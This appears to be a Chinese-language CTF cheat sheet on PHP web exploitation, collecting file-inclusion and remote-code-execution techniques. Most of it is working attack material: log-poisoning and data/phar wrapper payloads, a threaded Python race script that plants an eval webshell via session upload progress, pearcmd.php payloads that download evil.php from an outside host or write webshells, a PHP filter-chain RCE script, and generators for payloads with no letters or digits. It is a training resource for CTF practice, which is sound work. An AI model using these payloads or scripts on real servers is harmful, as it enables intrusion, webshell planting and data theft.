代码执行（限/e模式） preg_replace(PHP 5.5)功能 ： 函数执行一个正则表达式的搜索和替换定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换$pattern 存在 /e 模式修正符，允许代码执行/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行 filter_var() FILTER_VALIDATE_EMAIL 形式：local-part@domain-part 邮箱local-part部分可以用双引号包裹，双引号内即可填入任意字符，如&quot;Joe&#39;Blow&quot;@example.com FILTER_VALIDATE_URL 0://www.baidu.com; is_file() / file_exists() 超过20次软链接后可以绕过： ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php require_once() 包含的软连接层数较多时，hash匹配会直接失效造成重复包含，同 is_file() 参考：php源码分析 require_once 绕过不能重复包含文件的限制 include() 日志包含 URL：?x=/var/log/nginx/access.log 修改User-Agent为&lt;?php highlight_file(&#39;xxx.php&#39;); ?&gt; 有后缀绕过 ?c=data:text/plain,&lt;?php system(&#39;ls&#39;)?&gt; ?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4 ?c=data:,&lt;?php system(&#39;ls&#39;)?&gt; file协议包含 file:///etc/passwd file://localhost/etc/passwd zip/phar协议包含（有特定后缀） 这个方法适用于验证包含文件为特定后缀时。 zip 首先新建一个zip文件，里面压缩着一个php脚本。 然后构造zip://php.zip#php.jpg： http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg phar (PHP版本&gt;5.3.0) 首先要用phar类打包一个phar标准包： 1234&lt;?php$p = new PharData(dirname(__FILE__).&#x27;./test.zip&#x27;, 0,&#x27;test&#x27;,Phar::ZIP);$p-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt; 会生成一个zip的压缩文件。然后构造 http://127.0.0.1/file.php?file=phar://php.zip/php.jpg 利用session.upload_progress 可以利用session.upload_progress将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。 如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。 session有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值由ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。 默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空，此时我们可以利用竞争，在session文件内容清空前进行包含利用。 参考：https://www.freebuf.com/vuls/202819.html 常见PHP-Session存放位置 12345/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSED 12345678910111213141516171819202122232425262728#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;Q&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;cat fl0g.php&#x27;);&quot;&#125;url = &#x27;http://6bad481c-1da6-4a89-92f6-db28a56e4f28.chall.ctf.show/index.php&#x27;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) resp = session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;q.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session): while True: resp = session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessid,data=data) if &#x27;q.txt&#x27; in resp.text: print(resp.text) event.clear() else: #print(&quot;[+++++++++++++]retry&quot;) passif __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in range(1,30): threading.Thread(target=write,args=(session,)).start() for i in range(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 利用PEAR （开启register_argc_argv） 可能路径： 12/usr/local/lib/php/pearcmd.php/usr/share/pear/pearcmd.php PEAR是可重用的PHP组件框架和系统分发，会随PHP安装时自动安装。 ?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/eval.php ?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/eval.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+ HTTP/1.1（Burpsuite防浏览器转码） ?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://ip/evil.php （路径：/tmp/pear/download/evil.php） ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[0]);?&gt;+/tmp/hello.php（路径：/tmp/hello.php） 1234567 &lt;?phpheader(&#x27;Content-Disposition: attachment; filename=&quot;shell.php&quot;&#x27;); echo &lt;&lt;&lt;EOF&lt;?phpsystem(\\$_GET[0]);?&gt;EOF; ?file=/tmp/pear/download/shell.php&amp;0=/readflag PHPFilterChain RCE 参考： LFI 新姿势学习 hxp CTF 2021 - The End Of LFI? 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import requestsurl = &quot;&quot;file_to_use = &quot;/var/hint&quot;command = &quot;id&quot;#&lt;?=`$_GET[0]`;;?&gt;base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;conversions = &#123; &#x27;R&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;, &#x27;B&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;, &#x27;C&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;, &#x27;8&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;, &#x27;9&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;, &#x27;f&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;, &#x27;s&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;, &#x27;z&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;, &#x27;U&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;, &#x27;P&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;, &#x27;V&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;, &#x27;0&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;, &#x27;Y&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;, &#x27;W&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;, &#x27;d&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;, &#x27;D&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;, &#x27;7&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;, &#x27;4&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;&#125;# generate some garbage base64filters = &quot;convert.iconv.UTF8.CSISO2022KR|&quot;filters += &quot;convert.base64-encode|&quot;# make sure to get rid of any equal signs in both the string we just generated and the rest of the filefilters += &quot;convert.iconv.UTF8.UTF7|&quot;for c in base64_payload[::-1]: filters += conversions[c] + &quot;|&quot; # decode and reencode to get rid of everything that isn&#x27;t valid base64 filters += &quot;convert.base64-decode|&quot; filters += &quot;convert.base64-encode|&quot; # get rid of equal signs filters += &quot;convert.iconv.UTF8.UTF7|&quot;filters += &quot;convert.base64-decode&quot;final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;r = requests.get(url, params=&#123; &quot;0&quot;: command, &quot;file&quot;: final_payload&#125;)print(r.text) CNEXT exploits CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行 参考： 【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一） 原作者给出的exp: https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py die() / exit()参考：https://www.anquanke.com/post/id/202510 过滤关键词 urlencode 过滤%25 二次编码：a:%6%31 b:%6%32 i:%6%39 q:%7%31 r:%7%32 u:%7%35 U:%5%35 allow_url_include=Off file_get_contents 允许使用 data URI，会直接返回后面的内容，很奇怪的是，在 allow_url_include=Off 的情况下，不允许 require_once data URI 的，但是如果 data:,XXX 是一个目录名的话，就会放开限制。 12345678$ php -aInteractive mode enabledphp &gt; echo file_get_contents(&#x27;data:,123456/ricky&#x27;);123456/rickyphp &gt; echo require_once(&#x27;data:,123456/ricky&#x27;);flag&#123;xxxxxxxxxx&#125;php &gt; open()PHP原生类：ZipArchive::open($filename,$flags) 调用可删除文件：ZipArchive::open(&#39;xxx&#39;,ZipArchive::OVERWRITE)=ZipArchive::open(&#39;xxx&#39;,8) parse_url() URL 格式： scheme://user:password@address:port/path?query#fragment 参考：https://www.cnblogs.com/tr1ple/p/11137159.html //绕过 把//认为是相对路径（PHP&lt;5.4.7）。 如果是//，则被解析成host，后面的内容如果有/，被解析出path，而不是query了。 ///绕过 三个斜杠导致严重不合格的URL，parse_url() 返回FALSE。 basename()返回路径中的文件名部分，会去掉文件名开头的非ASCII值。 var_dump(basename(&quot;\\xffconfig.php&quot;)); =&gt; config.php var_dump(basename(&quot;config.php\\xff&quot;)); =&gt; config.php spl_autoload_register()PHP框架中有自动加载机制，autoload机制可以使得PHP程序有可能在使用类时才自动包含类文件，而不是一开始就将所有的类文件include进来，这种机制也称为lazy loading。 autoload大致可以使用两种方法：__autoload 和 spl 方法。 spl的autoload系列函数使用一个autoload调用堆栈，可以使用 spl_autoload_register 注册多个自定义的autoload函数。 spl_autoload_register() 如果不指定参数，就会自动包含 类名.php 或 类名.inc 的文件，并加载其中的“类名”类。 a. 上传webshell，后缀为 .inc，被重命名为 xxxx.inc； b. 序列化一个类名为 xxxx 的类对象； c. 将序列化以后的字符串作为cookie，发送到服务器上； d. 服务器反序列化这个字符串后，将会自动加载 xxxx 类，由于之前 spl_autoload_register 函数注册的方法，会自动加载 xxxx.inc，从而造成文件包含漏洞。 123&lt;?phpspl_autoload_register(&#x27;system&#x27;);new ls(); 当 spl_autoload_register 的参数不为空时，new一个类 ls，如果该 ls 类未定义，程序会寻找system 函数，并将 ls 作为参数，执行 system 函数，即执行了 system(&#39;ls&#39;);。 当 spl_autoload_register 的参数为空时。然后new一个xxx类，如果该xxx类未定义，程序会在工作空间中寻找 xxx.php 或 xxx.inc，并将其包含。 putenv()+system()参考：我是如何利用环境变量注入执行任意命令 envs[BASH_FUNC_echo%25%25]=()%20{%20id;%20} ini_set()ini_set($name,$value); =&gt; name=error_log&amp;value=/var/www/html/out.php mb_strpos()+mb_substr()利用mb_strpos与mb_substr这两个函数对某些不可见字符的解析差异导致的，可以利用特殊的不可见字符实现反序列化字符串逃逸。 当以 \\xf0 开头的字节序列出现在 UTF-8 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-8 编码规范定义了以 \\xf0 开头的字节序列用于编码较大的 Unicode 字符。 每发送一个 %f0abc，mb_strpos() 认为是4个字节，mb_substr() 认为是1个字节，相差3个字节（向后移动3位）； 每发送一个 %f0%9fab，mb_strpos() 认为是3个字节，mb_substr() 认为是1个字节，相差2个字节（向后移动2位）； 每发送一个 %f0%9f%9fa，mb_strpos() 认为是2个字节，mb_substr() 认为是1个字节，相差1个字节（向后移动1位）； 每发送一个 %9f，`mb_strpos() 会忽略，mb_substr() 认为是1个字节，相差1个字节（向前移动1位）。 结论：mb_strpos() 相对于 mb_substr() 来说，可以把索引值向后移动。 参考： https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/ https://www.cnblogs.com/gxngxngxn/p/18187578 逃跑大师 move_uploaded_file()当move_uploaded_file函数参数可控时，可以尝试 /. 绕过，因为该函数会忽略掉文件末尾的 /.，所以可以构造 save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的 /. 可以实现保存文件为 .php。 参数特性 参数中的+、[、空格、.均会变为_ 参数形式A_B.C：使用A[B.C传入 ​ 无字母/数字/特定符号RCE 取反（~） phpinfo() → (~%8F%97%8F%96%91%99%90)() system(&#39;ls&#39;) → (~%8C%86%8C%8B%9A%92)(~%93%8C) 异或（^） phpinfo() → $_GET[x]&amp;x=phpinfo → ${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}();&x=phpinfo system(&#39;ls&#39;) → $_GET[x]($_GET[y])&amp;x=system&amp;y=ls → ${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}(${%A0%A0%A0%A0^%FF%E7%E5%F4}{y});&x=system&y=ls 无字母情形： phpinfo() → (&#39;484880800&#39;^&#39;8.8-**)00&#39;^&#39;|~||||~()&#39;) system(&#39;ls&#39;) → (&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;) 或（|） 可以直接将需要构造的字符串与反引号进行异或，得到的结果再与反引号相或即可得到原字符串。 123&lt;?phpecho &quot;````````&quot;^&quot;readfile&quot;;echo &quot;````&quot;^&quot;flag&quot;; payload例：（readfile(&quot;/flag&quot;)） $code = &quot;(&#39;````````&#39;|&#39; &#39;)(&#39;/````&#39;|&#39;/ &#39;));//&quot;; 参考： https://blog.csdn.net/miuzzx/article/details/108569080 https://blog.csdn.net/miuzzx/article/details/109143413 构造： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php/* author yu22x */$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123; for ($j=0; $j &lt;256 ; $j++) &#123; if($i&lt;16)&#123; $hex_i=&#x27;0&#x27;.dechex($i); &#125; else&#123; $hex_i=dechex($i); &#125; if($j&lt;16)&#123; $hex_j=&#x27;0&#x27;.dechex($j); &#125; else&#123; $hex_j=dechex($j); &#125; $preg = &#x27;/[0-9a-z]/i&#x27;;//根据题目给的正则表达式修改即可 if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123; echo &quot;&quot;; &#125; else&#123; $a=&#x27;%&#x27;.$hex_i; $b=&#x27;%&#x27;.$hex_j; $c=(urldecode($a)|urldecode($b)); if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123; $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;; &#125; &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile); 1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg): s1=&quot;&quot; s2=&quot;&quot; for i in arg: f=open(&quot;or_rce.txt&quot;,&quot;r&quot;) while True: t=f.readline() if t==&quot;&quot;: break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;|\\&quot;&quot;+s2+&quot;\\&quot;)&quot; #双引号可换单引号 return(output) while True: param=action(input(&quot;\\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot; print(param) ++运算自增构造 1234567891011121314&lt;?php$a=(_/_._)[0];//直接拼接成字符串并切片$o=++$a;//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O$o=++$a.$o;//$o=&gt;PO,$a=&gt;P$a++;//Q$a++;//R$o.=++$a;//$o=&gt;POS,$a=&gt;S$o.=++$a;//$o=&gt;POST,$a=&gt;T$_=_.$o;//_POST$$_[0]($$_[_]);//$_POST[0]($_POST[_]);//Payload://code=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=id//code=$_=(_/_._)[_];$_++;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);&amp;_POST=system&amp;_=id 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/env python3#-*- coding:utf-8 -*-#__author__: 颖奇L&#x27;Amore www.gem-love.comimport requestsfrom urllib.parse import quote_plusdef g(payload, buff): offset = 3 + buff res = &quot;&quot; base = 65 for i in range(len(payload)): if payload[i] == &#x27;_&#x27; or payload[i] == &#x27;/&#x27;: continue _ascii = ord(payload[i]) #init underline = &quot;$&quot; + (&quot;_&quot; * (i + offset)) undefined = &quot;$&quot; + (&quot;_&quot; * (len(payload) + offset + 15)) var = f&quot;++&#123;underline&#125;;$__-=&#123;underline&#125;;$__++;&#123;underline&#125;/=$__;&#123;underline&#125;=((&#123;undefined&#125;/&#123;undefined&#125;).&#123;underline&#125;)&quot;+r&quot;&#123;++$__&#125;;$__--;&quot; res += var; tmp = &#x27;&#x27; if _ascii &gt; base: for i in range(_ascii-base): tmp = tmp + f&quot;++&#123;underline&#125;;&quot; res += tmp first = &quot;$&quot; + (&quot;_&quot; * offset) for i in range(1, len(payload)): if payload[i] == &#x27;_&#x27;: res += f&quot;&#123;first&#125;.=&#x27;_&#x27;;&quot; continue if payload[i] == &#x27;/&#x27;: res += f&quot;&#123;first&#125;.=&#x27;/&#x27;;&quot; continue final_var = &quot;$&quot; + (&quot;_&quot; * (i + offset)) res += f&quot;&#123;first&#125;.=&#123;final_var&#125;;&quot; return [res, &quot;$&quot; + &quot;_&quot; * (offset)]pre = &quot;&#x27;&#x27;);&quot;after = &#x27;//&#x27;buff = len(&#x27;STRTOLOWERSHOW_SOURCE&#x27;)flag = g(&quot;/FLAG&quot;, buff)buff = len(&#x27;STRTOLOWER&#x27;)showsource = g(&quot;SHOW_SOURCE&quot;, buff)buff = 0strtolower = g(&#x27;STRTOLOWER&#x27;, buff)final = &#x27;&#x27;#1.构造STRTOLOWER并存进变量afinal += strtolower[0]a = strtolower[1] # a = &#x27;$___&#x27; # STRTOLOWER#2.构造SHOW_SOURCE并存进变量bfinal += showsource[0]b = showsource[1] # b = &#x27;$_____________&#x27; #SHOW_SOURCE#3.构造/FLAG并存进变量cfinal += flag[0] + flag[1] + &quot;=&#x27;/&#x27;.&quot; + flag[1] + &#x27;;&#x27;c = flag[1] # c = &#x27;$________________________&#x27; #/FLAG#声明好abc变量padding = f&#x27;$______________________________________________=&#123;a&#125;;$_______________________________________________=&#123;b&#125;;$________________________________________________=&#123;c&#125;;&#x27;final += padding# 4.变量d = a(c) 则变量d为/flagd = &quot;$______________________________________________($________________________________________________);&quot;padding = &#x27;$_________________________________________________=&#x27;+dfinal += padding#5. b(d) 即为SHOW_SOURCE(&#x27;/flag&#x27;)final += &#x27;$_______________________________________________($_________________________________________________);&#x27;final = pre + finalfinal = final + afterprint(final.replace(&#x27;+&#x27;, &#x27;%2b&#x27;)) 12345678910111213141516171819202122232425262728293031323334#关键字构造#$_GET[0]($_GET[1]);need = &#x27;GET&#x27;alpha = list(set(need))alpha.sort()print(alpha)greece = &#x27;α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ&#x27;.split(&#x27; &#x27;)out = &#x27;$_=C;&#x27;cnt = ord(&#x27;C&#x27;)for k in alpha: if ord(k)-ord(&#x27;C&#x27;) in range(26): now_php = &#x27;&#x27; for i in range(ord(k)-cnt): now_php += &#x27;$_++;&#x27; cnt += 1 icon = greece[ord(k)-ord(&#x27;C&#x27;)] now_php += f&#x27;$&#123;icon&#125;=$_;&#x27; out += now_phpfunc = []for k in need: if ord(k)-ord(&#x27;C&#x27;) in range(26): icon = greece[ord(k)-ord(&#x27;C&#x27;)] func += [f&#x27;$&#123;icon&#125;&#x27;] else: func += [k]func = &#x27;.&#x27;.join(func)print(func)payload = f&#x27;&#123;out&#125;?&gt;&lt;?=($&#123;&#123;_.&#123;func&#125;&#125;&#125;[0])($&#123;&#123;_.&#123;func&#125;&#125;&#125;[1]);&#x27;print(payload) 文件上传+执行 参考： https://blog.csdn.net/qq_46091464/article/details/108513145 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。 执行. /tmp/phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符： *可以代替0个及以上任意字符 ?可以代表1个任意字符 那么，/tmp/phpXXXXXX就可以表示为/*/?????????或/???/?????????。 但是，在执行第一个匹配上的文件的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。 glob通配符支持用[^x]的方法来构造“这个位置不是字符x”。可以利用[@-[]来表示大写字母。当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。 POST上传文件数据包： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在上传文件1.php内容添加sh命令： 12#!/bin/shls 上传抓包，构造poc执行命令： ?c=./???/????????[@-[] 通配符（仅无字母） base64: /???/????64 ????.??? bzip2: /???/???/????2 ????.??? [~(异或)][!%FF]形式 123456789101112131415161718def one(s): ss = &quot;&quot; for each in s: ss += &quot;%&quot; + str(hex(255 - ord(each)))[2:].upper() return f&quot;[~&#123;ss&#125;][!%FF](&quot;&quot;&quot;&quot;组成类似于system(pos(next(getallheaders())));即可a=whoami&quot;&quot;&quot;while 1: a = input(&quot;:&gt;&quot;).strip(&quot;)&quot;) aa = a.split(&quot;(&quot;) s = &quot;&quot; for each in aa[:-1]: s += one(each) s += &quot;)&quot; * (len(aa) - 1) + &quot;;&quot; print(s) eval函数下 字符串拼接 a=(s.y.s.t.e.m)(&#39;cat /flag&#39;); 进制编码 a=hex2bin(&#39;73797374656d&#39;)(&#39;cat /flag&#39;); 异或 a=(&#39;0000000&#39;^&#39;CICDU]&#39;)(&#39;cat /flag&#39;); a=(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;); 套娃 a=eval($_POST[1]);&amp;1=phpinfo(); 纯数字构造（Linux系统级） 12345678910111213$(($&#123;_&#125;))#0$((~$(($&#123;_&#125;))))#-1$((~$(($((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))))))#36#去+号也可$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))#36 #去+号也可 参考： CTFshow-RCE极限大挑战 CTFshow-周末大挑战 ​ 无参数/带参数RCE无参函数 phpinfo() phpversion() chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) -&gt; . chr(ord(hebrevc(crypt(phpversion())))) -&gt; . localeconv() 返回一包含本地数字及货币格式信息的数组，而数组第一项就是.。 time() 返回当前Unix时间戳。 localtime() 取得本地时间。 getcwd() 返回当前工作目录。 dirname() 返回路径中的目录部分。 getenv() 获取一个环境变量的值（在7.1之后可以不给予参数）。 getallheaders() 获取全部HTTP请求头信息。（Apache） apache_request_headers() 获取全部 HTTP 请求头信息，包含当前请求所有头信息的数组，失败返回 FALSE。（Apache） get_defined_vars() 返回由所有已定义变量所组成的数组。（Nginx） get_defined_functions() 返回由所有已定义函数所组成的数组。 session_start() 启动新会话或者重用现有会话，告诉PHP使用session。（PHP默认是不主动使用session的，配合session_id()） realpath_cache_get() 获得真实路径缓存的详情。 get_class() 获取当前调用方法的类名。 get_called_class() 获取静态绑定后的类名。 ini_get_all() 以数组的形式返回整个php的环境变量（配置信息）。 __HALT_COMPILER() 中断编译器的执行。（中断php的执行，不会检查后面的语句） 套用函数（有参） array_map() 返回用户自定义函数作用后的数组。 array_map(&#39;system&#39;,[&#39;ls&#39;]); scandir() 列出指定路径中的文件和目录。 scandir(&#39;.&#39;) glob() 返回匹配指定模式的文件名或目录。 print_r(glob(&quot;*&quot;)); print_r(glob(&quot;./*&quot;)[2]); current() 返回数组中的当前单元，默认取第一个值。 current(localeconv()) → . ?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo(); pos() 返回数组中的当前元素的值，current()函数的别名。 next() / prev() / reset() / end() 将数组的内部指针向前移动一位 / 倒回一位 / 指向第一个单元 / 指向最后一个单元。 end(getallheaders()) + REQUEST-HEADER-last xx:yy = yy （配合自定义请求头绕过关键字） assert() / eval() 命令执行。 assert(phpinfo();); assert(assert($_POST[c])); chdir() 改变目录。 file_get_contents() highlight_file() / show_source() readfile() / readgzfile() echo() print_r() var_dump() dirname() 返回路径中的目录部分。 chr() 从指定的 ASCII 值返回字符。 array_pop() 弹出并返回数组最后一个元素的值，并将数组的长度减一。 array_reverse() 以相反的元素顺序返回数组。 array_rand() 返回数组中的随机键名，或者如果规定函数返回不只一个键名，则返回包含随机键名的数组。 array_flip() 用于反转/交换数组中所有的键名以及它们关联的键值。 array_slice() 在数组中根据条件取出一段值，并返回。 hex2bin() 转换十六进制字符串为二进制字符串。 session_id() 获取到当前的session id。 session_id(session_start()) create_function() 创建一个匿名函数（lambda样式）。代码注入。 hex2bin() 把十六进制值转换为 ASCII 字符。 hex2bin(&#39;73797374656D&#39;) -&gt; system 参考 